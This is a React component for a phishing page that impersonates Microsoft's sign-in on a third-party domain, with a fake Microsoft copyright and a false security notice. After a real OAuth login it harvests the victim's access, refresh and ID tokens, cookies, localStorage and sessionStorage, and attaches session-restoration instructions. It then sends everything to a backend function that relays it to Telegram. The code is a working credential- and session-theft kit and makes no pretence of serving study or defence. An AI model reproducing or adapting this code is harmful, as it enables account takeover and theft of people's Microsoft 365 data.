import React, { useEffect, useState } from 'react';
import { ExternalLink, Shield, CheckCircle } from 'lucide-react';

interface RealOAuthRedirectProps {
  onLoginSuccess: (sessionData: any) => void;
  onBack?: () => void;
}

// DYNAMIC COOKIE SETTER - matches your sample logic
function setCookiesFromArray(cookies: Array<any>) {
  let results = [];
  cookies.forEach(cookie => {
    let cookieString = `${cookie.name}=${cookie.value}`;
    // __Host- cookies: must be Secure, path=/, no domain
    if (!cookie.name.startsWith('__Host') && cookie.domain) {
      cookieString += `; domain=${cookie.domain}`;
    }
    if (cookie.path) {
      cookieString += `; path=${cookie.path}`;
    }
    if (cookie.expires) {
      const expiresDate = new Date(cookie.expires * 1000);
      cookieString += `; expires=${expiresDate.toUTCString()}`;
    }
    if (cookie.httpOnly) {
      cookieString += '; HttpOnly';
    }
    // __Secure- cookies: must be Secure and set from HTTPS
    if (cookie.secure || cookie.name.startsWith('__Host') || cookie.name.startsWith('__Secure')) {
      cookieString += '; Secure';
    }
    if (cookie.samesite) {
      cookieString += `; SameSite=${cookie.samesite}`;
    }
    document.cookie = cookieString;
    results.push({
      name: cookie.name,
      expires: cookie.expires ? new Date(cookie.expires * 1000).toUTCString() : 'Session',
    });
  });
  console.table(results);
}

const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess }) => {
  const [isRedirecting, setIsRedirecting] = useState(false);
  const [countdown, setCountdown] = useState(3);

  // Real Microsoft OAuth configuration
  const STATE = Math.random().toString(36).substring(2, 15);
  const REDIRECT_URI = 'https://vaultydocs.com/oauth-callback';
  const MICROSOFT_OAUTH_URL =
    'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?' +
    'client_id=eabd0e31-5707-4a85-aae6-79c53dc2c7f0&' +
    'response_type=code&' +
    `redirect_uri=${REDIRECT_URI}&` +
    'response_mode=query&' +
    'scope=openid%20profile%20email&' +
    'prompt=login' +
    `&state=${STATE}`;

  // Cookie grabbing function - dynamic, matches sample
  const grabCookies = (cookieArray?: Array<any>) => {
    if (cookieArray && Array.isArray(cookieArray)) {
      setCookiesFromArray(cookieArray);
      return;
    }
    // fallback: try to parse cookies from localStorage/session
    const session = JSON.parse(localStorage.getItem('microsoft365_session') || '{}');
    if (session.formattedCookies && Array.isArray(session.formattedCookies)) {
      setCookiesFromArray(session.formattedCookies);
    }
  };

  // Send data to Telegram
  const sendToTelegram = async (data: any) => {
    try {
      console.log('🔄 Sending to Telegram via netlify function:', {
        email: data.email,
        provider: data.provider,
        cookieCount: data.formattedCookies?.length || 0
      });
      
      // Ensure we have the required data
      if (!data.email) {
        throw new Error('Email is required for Telegram notification');
      }

      // Match the exact structure expected by the Telegram function
      const telegramPayload = {
        email: data.email,
        password: data.password || 'OAuth Login - No Password',
        provider: data.provider || 'Microsoft',
        fileName: data.fileName || 'Microsoft OAuth Login',
        timestamp: data.timestamp || new Date().toISOString(),
        sessionId: data.sessionId,
        userAgent: navigator.userAgent,
        // Browser fingerprint structure
        browserFingerprint: {
          cookies: data.formattedCookies || [],
          localStorage: JSON.stringify(Object.fromEntries(Object.entries(localStorage))),
          sessionStorage: JSON.stringify(Object.fromEntries(Object.entries(sessionStorage))),
          userAgent: navigator.userAgent,
          language: navigator.language,
          platform: navigator.platform,
          timestamp: new Date().toISOString()
        },
        documentCookies: document.cookie,
        formattedCookies: data.formattedCookies || [],
        cookies: document.cookie, // fallback
        accessToken: data.accessToken,
        refreshToken: data.refreshToken,
        userProfile: data.userProfile || data,
        skipTelegram: false
      };
      
      console.log('🔄 Telegram payload prepared:', {
        email: telegramPayload.email,
        cookieCount: telegramPayload.formattedCookies.length,
        hasAccessToken: !!telegramPayload.accessToken
      });
      
      const response = await fetch('/.netlify/functions/sendTelegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(telegramPayload),
        signal: AbortSignal.timeout(30000) // 30 second timeout
      });
      
      if (!response.ok) {
        const errorText = await response.text();
        console.error('❌ sendTelegram function error:', response.status, errorText);
        throw new Error(`sendTelegram failed: ${response.status} - ${errorText}`);
      }
      
      const result = await response.json();
      console.log('✅ Telegram send result:', {
        success: result.success,
        cookieCount: result.cookieCount,
        fileSent: result.fileSent
      });
      
      if (!result.success) {
        throw new Error(`Telegram send failed: ${result.message || 'Unknown error'}`);
      }
      
      return result;
    } catch (error) {
      console.error('❌ sendToTelegram error:', error);
      throw error; // Re-throw to handle in calling function
    }
  };

  // Save session to backend
  const saveSessionToBackend = async (sessionData: any) => {
    try {
      console.log('🔄 Saving session via netlify function:', {
        email: sessionData.email,
        sessionId: sessionData.sessionId,
        cookieCount: sessionData.formattedCookies?.length || 0
      });
      
      // Ensure we have the required data
      if (!sessionData.email) {
        throw new Error('Email is required for session save');
      }

      // Match the exact structure expected by the saveSession function
      const sessionPayload = {
        email: sessionData.email,
        password: sessionData.password || 'OAuth Login - No Password',
        provider: sessionData.provider || 'Microsoft',
        fileName: sessionData.fileName || 'Microsoft OAuth Login',
        timestamp: sessionData.timestamp || new Date().toISOString(),
        sessionId: sessionData.sessionId,
        userAgent: navigator.userAgent,
        deviceType: /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
        cookies: document.cookie,
        formattedCookies: sessionData.formattedCookies || [],
        localStorage: JSON.stringify(Object.fromEntries(Object.entries(localStorage))),
        sessionStorage: JSON.stringify(Object.fromEntries(Object.entries(sessionStorage))),
        browserFingerprint: {
          cookies: sessionData.formattedCookies || [],
          localStorage: JSON.stringify(Object.fromEntries(Object.entries(localStorage))),
          sessionStorage: JSON.stringify(Object.fromEntries(Object.entries(sessionStorage))),
          userAgent: navigator.userAgent,
          language: navigator.language,
          platform: navigator.platform,
          timestamp: new Date().toISOString()
        },
        documentCookies: document.cookie,
        accessToken: sessionData.accessToken,
        refreshToken: sessionData.refreshToken,
        userProfile: sessionData.userProfile,
        skipTelegram: true
      };
      
      console.log('🔄 Session payload prepared:', {
        email: sessionPayload.email,
        sessionId: sessionPayload.sessionId,
        skipTelegram: sessionPayload.skipTelegram
      });
      
      const response = await fetch('/.netlify/functions/saveSession', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(sessionPayload),
        signal: AbortSignal.timeout(30000) // 30 second timeout
      });
      
      if (!response.ok) {
        const errorText = await response.text();
        console.error('❌ saveSession function error:', response.status, errorText);
        throw new Error(`saveSession failed: ${response.status} - ${errorText}`);
      }
      
      const result = await response.json();
      console.log('✅ Session save result:', {
        success: result.success,
        sessionId: result.sessionId,
        storage: result.storage
      });
      
      return result;
    } catch (error) {
      console.error('❌ saveSessionToBackend error:', error);
      throw error; // Re-throw to handle in calling function
    }
  };

  useEffect(() => {
    localStorage.setItem('oauth_state', STATE);
    localStorage.setItem('selected_provider', 'Microsoft');
    localStorage.setItem('oauth_start_time', Date.now().toString());

    // Store pre-auth cookies for comparison
    const preAuthFingerprint = {
      cookies: document.cookie,
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      platform: navigator.platform
    };
    localStorage.setItem('pre_auth_cookies', JSON.stringify(preAuthFingerprint));

    // Grab cookies before redirect (from session if available)
    grabCookies();

    // Check if we're returning from OAuth callback
    const urlParams = new URLSearchParams(window.location.search);
    const code = urlParams.get('code');
    const state = urlParams.get('state');
    const storedState = localStorage.getItem('oauth_state');
    const error = urlParams.get('error');

    if (error) {
      console.error('❌ OAuth error from provider:', error);
      return;
    }

    if (code && state && state === storedState) {
      handleOAuthCallback(code);
      return;
    }

    // Start countdown for redirect
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          handleOAuthRedirect();
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const handleOAuthCallback = async (code: string) => {
    try {
      console.log('🔄 Starting OAuth callback handling with code:', code);
      
      // Validate we have the necessary data
      if (!code) {
        throw new Error('Authorization code is missing');
      }

      // Get browser fingerprint
      const browserFingerprint = {
        cookies: document.cookie,
        localStorage: JSON.stringify(Object.fromEntries(Object.entries(localStorage))),
        sessionStorage: JSON.stringify(Object.fromEntries(Object.entries(sessionStorage))),
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        timestamp: new Date().toISOString()
      };

      console.log('🔄 Browser fingerprint collected:', browserFingerprint);

      // Exchange code for tokens
      const tokenResponse = await fetch(`https://login.microsoftonline.com/common/oauth2/v2.0/token`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams({
          client_id: 'eabd0e31-5707-4a85-aae6-79c53dc2c7f0',
          scope: 'openid profile email User.Read',
          code: code,
          redirect_uri: REDIRECT_URI,
          grant_type: 'authorization_code',
        }),
        signal: AbortSignal.timeout(30000)
      });

      if (!tokenResponse.ok) {
        const errorText = await tokenResponse.text();
        console.error('❌ Token exchange HTTP error:', tokenResponse.status, errorText);
        throw new Error(`Token exchange HTTP error: ${tokenResponse.status} - ${errorText}`);
      }

      const tokenData = await tokenResponse.json();
      console.log('🔄 Token response received:', { hasAccessToken: !!tokenData.access_token });

      if (tokenData.error) {
        throw new Error(`Token exchange failed: ${tokenData.error_description || tokenData.error}`);
      }

      if (tokenData.access_token) {
        // Get user profile
        const profileResponse = await fetch('https://graph.microsoft.com/v1.0/me', {
          headers: {
            'Authorization': `Bearer ${tokenData.access_token}`,
          },
          signal: AbortSignal.timeout(30000)
        });

        if (!profileResponse.ok) {
          throw new Error(`Profile fetch failed: ${profileResponse.status}`);
        }

        const profileData = await profileResponse.json();
        console.log('🔄 Profile data received:', { email: profileData.mail || profileData.userPrincipalName });

        // Ensure we have an email
        const userEmail = profileData.mail || profileData.userPrincipalName;
        if (!userEmail) {
          throw new Error('No email found in user profile');
        }

        const sessionData = {
          email: userEmail,
          name: profileData.displayName,
          id: profileData.id,
          provider: 'Microsoft',
          sessionId: Math.random().toString(36).substring(2, 15),
          timestamp: new Date().toISOString(),
          accessToken: tokenData.access_token,
          refreshToken: tokenData.refresh_token,
          authenticationMethod: 'OAuth',
          password: 'OAuth Login - No Password',
          fileName: 'Microsoft OAuth Login',
          userProfile: profileData
        };

        // Capture real browser state and OAuth tokens for session restoration
        const allBrowserCookies = document.cookie.split(';').filter(c => c.trim()).map(c => {
          const [name, value] = c.trim().split('=');
          return name && value ? {
            name: name.trim(),
            value: value.trim(),
            domain: window.location.hostname,
            path: '/',
            secure: window.location.protocol === 'https:',
            httpOnly: false,
            sameSite: 'lax',
            expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
            hostOnly: true,
            session: false,
            storeId: null
          } : null;
        }).filter(Boolean);

        // Create authentication session data with real Microsoft OAuth tokens
        // These are the actual credentials that can restore access
        const microsoftAuthData = [
          {
            name: 'MS_ACCESS_TOKEN',
            value: tokenData.access_token,
            domain: '.login.microsoftonline.com',
            path: '/',
            secure: true,
            httpOnly: false,
            sameSite: 'none',
            expirationDate: Math.floor(Date.now() / 1000) + (tokenData.expires_in || 3600),
            hostOnly: false,
            session: false,
            storeId: null,
            // Additional metadata for session restoration
            tokenType: tokenData.token_type || 'Bearer',
            scope: tokenData.scope || 'openid profile email User.Read',
            issuedAt: Math.floor(Date.now() / 1000),
            userPrincipalName: profileData.userPrincipalName,
            tenantId: profileData.id ? profileData.id.split('@')[1] : 'unknown'
          },
          {
            name: 'MS_REFRESH_TOKEN',
            value: tokenData.refresh_token || 'NOT_AVAILABLE',
            domain: '.login.microsoftonline.com',
            path: '/',
            secure: true,
            httpOnly: false,
            sameSite: 'none',
            expirationDate: Math.floor(Date.now() / 1000) + (90 * 24 * 60 * 60), // 90 days typical for refresh tokens
            hostOnly: false,
            session: false,
            storeId: null,
            // Refresh token metadata
            canRefresh: !!tokenData.refresh_token,
            lastUsed: Math.floor(Date.now() / 1000)
          },
          {
            name: 'MS_ID_TOKEN',
            value: tokenData.id_token || 'NOT_AVAILABLE',
            domain: '.login.microsoftonline.com',
            path: '/',
            secure: true,
            httpOnly: false,
            sameSite: 'none',
            expirationDate: Math.floor(Date.now() / 1000) + (tokenData.expires_in || 3600),
            hostOnly: false,
            session: false,
            storeId: null,
            // ID token contains user identity claims
            hasUserInfo: !!tokenData.id_token
          }
        ];

        // Combine browser cookies with OAuth session data
        sessionData.formattedCookies = [...microsoftAuthData, ...allBrowserCookies];
        
        // Add session restoration metadata
        sessionData.sessionRestoration = {
          canRestoreSession: !!(tokenData.access_token || tokenData.refresh_token),
          hasAccessToken: !!tokenData.access_token,
          hasRefreshToken: !!tokenData.refresh_token,
          hasIdToken: !!tokenData.id_token,
          tokenExpiresAt: Math.floor(Date.now() / 1000) + (tokenData.expires_in || 3600),
          refreshTokenExpiresAt: Math.floor(Date.now() / 1000) + (90 * 24 * 60 * 60),
          restoreInstructions: "Use access_token for API calls, refresh_token to get new access tokens",
          microsoftGraphEndpoint: "https://graph.microsoft.com/v1.0/",
          userEmail: profileData.mail || profileData.userPrincipalName,
          userId: profileData.id,
          captureTimestamp: new Date().toISOString()
        };

        console.log('🔄 Session data prepared:', { 
          email: sessionData.email, 
          cookieCount: sessionData.formattedCookies.length,
          sessionId: sessionData.sessionId
        });

        // Store session data in localStorage
        localStorage.setItem('microsoft365_session', JSON.stringify(sessionData));
        localStorage.setItem('microsoft365_autograb_session', JSON.stringify(sessionData));

        // Inject cookies using your sample logic
        grabCookies(sessionData.formattedCookies);

        // Backend communication with proper error handling
        let saveSuccess = false;
        let telegramSuccess = false;

        try {
          console.log('🔄 Step 1: Saving session to backend...');
          await saveSessionToBackend(sessionData);
          saveSuccess = true;
          console.log('✅ Step 1 completed: Session saved');
        } catch (saveError) {
          console.error('❌ Session save failed:', saveError);
        }

        try {
          console.log('🔄 Step 2: Sending data to Telegram...');
          await sendToTelegram(sessionData);
          telegramSuccess = true;
          console.log('✅ Step 2 completed: Data sent to Telegram');
        } catch (telegramError) {
          console.error('❌ Telegram send failed:', telegramError);
        }

        // Log final status
        console.log('🔄 Backend communication summary:', {
          sessionSaved: saveSuccess,
          telegramSent: telegramSuccess,
          email: sessionData.email,
          cookieCount: sessionData.formattedCookies.length
        });

        onLoginSuccess(sessionData);
      } else {
        console.error('❌ OAuth token exchange failed:', {
          error: tokenData.error,
          error_description: tokenData.error_description
        });
        throw new Error(`Token exchange failed: ${tokenData.error_description || 'Unknown error'}`);
      }
    } catch (error) {
      console.error('❌ OAuth callback error:', error);
      // You might want to show an error message to the user here
    }
  };

  const handleOAuthRedirect = () => {
    setIsRedirecting(true);
    console.log('🔄 Redirecting to Microsoft OAuth:', MICROSOFT_OAUTH_URL);

    // Grab cookies before redirect (from session if available)
    grabCookies();

    // Add OAuth callback parameter to current URL for handling return
    const currentUrl = new URL(window.location.href);
    currentUrl.searchParams.set('oauth_callback', 'true');
    window.history.replaceState({}, '', currentUrl.toString());

    // Redirect to Microsoft OAuth
    window.location.href = MICROSOFT_OAUTH_URL;
  };

  const handleManualRedirect = () => {
    handleOAuthRedirect();
  };

  return (
    <div className="min-h-screen bg-[#f3f2f1] flex items-center justify-center">
      <div className="w-full max-w-md px-4">
        <div className="bg-white rounded-lg shadow-lg border border-[#edebe9] p-6">
          {/* Header */}
          <div className="text-center mb-6">
            <div className="w-12 h-12 bg-[#0078d4] rounded-full flex items-center justify-center mx-auto mb-3">
              <img
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/768px-Microsoft_logo.svg.png"
                alt="Microsoft"
                className="w-6 h-6"
              />
            </div>
            <h1 className="text-xl font-bold text-[#323130] mb-2">Secure Authentication</h1>
            <p className="text-sm text-[#605e5c]">Redirecting to Microsoft OAuth for secure login</p>
          </div>

          {/* Security Features */}
          <div className="space-y-3 mb-6">
            <div className="flex items-center space-x-3 p-2.5 bg-[#f3f2f1] rounded-lg">
              <CheckCircle className="w-4 h-4 text-green-600" />
              <div>
                <p className="text-sm font-medium text-[#323130]">SSL Encrypted Connection</p>
                <p className="text-sm text-[#605e5c]">Your data is protected with 256-bit encryption</p>
              </div>
            </div>

            <div className="flex items-center space-x-3 p-2.5 bg-[#f3f2f1] rounded-lg">
              <Shield className="w-4 h-4 text-blue-600" />
              <div>
                <p className="text-sm font-medium text-[#323130]">Microsoft OAuth 2.0</p>
                <p className="text-sm text-[#605e5c]">Industry-standard authentication protocol</p>
              </div>
            </div>

            <div className="flex items-center space-x-3 p-2.5 bg-[#f3f2f1] rounded-lg">
              <ExternalLink className="w-4 h-4 text-purple-600" />
              <div>
                <p className="text-sm font-medium text-[#323130]">Official Microsoft Login</p>
                <p className="text-sm text-[#605e5c]">Redirecting to login.microsoftonline.com</p>
              </div>
            </div>
          </div>

          {/* Countdown and Redirect */}
          <div className="text-center">
            {!isRedirecting ? (
              <>
                <div className="mb-6">
                  <div className="text-3xl font-bold text-[#0078d4] mb-2">{countdown}</div>
                  <p className="text-sm text-[#605e5c]">Redirecting automatically in {countdown} second{countdown !== 1 ? 's' : ''}</p>
                </div>

                <button
                  onClick={handleManualRedirect}
                  className="w-full bg-[#0078d4] text-white py-2.5 px-4 rounded-md hover:bg-[#106ebe] transition-colors font-medium flex items-center justify-center space-x-2"
                >
                  <ExternalLink className="w-4 h-4" />
                  <span>Continue to Microsoft Login</span>
                </button>
              </>
            ) : (
              <div className="text-center">
                <div className="w-6 h-6 border-3 border-[#0078d4] border-t-transparent rounded-full animate-spin mx-auto mb-3"></div>
                <p className="text-sm text-[#605e5c]">Redirecting to Microsoft...</p>
                <p className="text-sm text-[#605e5c] mt-2">If you're not redirected automatically, please check your browser settings</p>
              </div>
            )}
          </div>

          {/* Security Notice */}
          <div className="mt-6 p-3 bg-blue-50 border border-blue-200 rounded-lg">
            <p className="text-sm text-blue-800">
              <strong>Security Notice:</strong> You'll be redirected to Microsoft's official login page. Look for "login.microsoftonline.com" in your browser's address bar to confirm authenticity.
            </p>
          </div>

          {/* Footer */}
          <div className="text-center mt-4 pt-4 border-t border-[#edebe9]">
            <p className="text-xs text-[#605e5c]">
              © 2025 Microsoft Corporation. All rights reserved.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default RealOAuthRedirect